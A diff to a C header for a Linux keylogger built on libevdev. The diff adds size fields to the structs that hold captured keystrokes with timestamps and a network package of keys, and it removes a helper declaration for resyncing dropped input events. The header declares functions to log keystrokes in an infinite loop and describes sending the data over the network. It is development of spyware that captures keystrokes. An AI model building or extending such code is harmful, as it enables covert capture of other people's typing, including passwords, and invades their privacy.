@@ -19,6 +19,7 @@
  * Represents all the associated data for one key that was pressed
  */
 typedef struct {
+  size_t size;      // An integer representing the size of the key_info.
   char* key;        // A string representing a key that was pressed.
   char* timestamp;  // The approximate time (UTC) that the key was pressed.
   // char* application; /* Represents the active application of the user when
@@ -30,6 +31,7 @@ typedef struct {
  * Represents all the data that is sent over the network
  */
 typedef struct {
+  size_t size;     // An integer representing the size of the key_package.
   key_info* keys;  // An array of keys to be sent over the network.
   size_t keys_arr_size;
   // char* host_device_name;  // A string representing the device name of the
@@ -53,18 +55,6 @@ void end_keylogger(void);
  * data for the overall session.
  */
 void log_device(key_package* key_package);
-
-/**
- * Helper function to parse large amounts of incoming events.
- *
- * If the device sends events faster than can be read, the kernel buffers will
- * fill up and the kernel will skip events. This function resyncs the device
- * and updates the internal state before reading events again.
- *
- * @param dev A pointer to a libevdev instance, representing the built-in
- * keyboard
- */
-void handle_syn_dropped(struct libevdev* dev);
 
 /**
  * Runs an infinite loop to store user keystrokes.
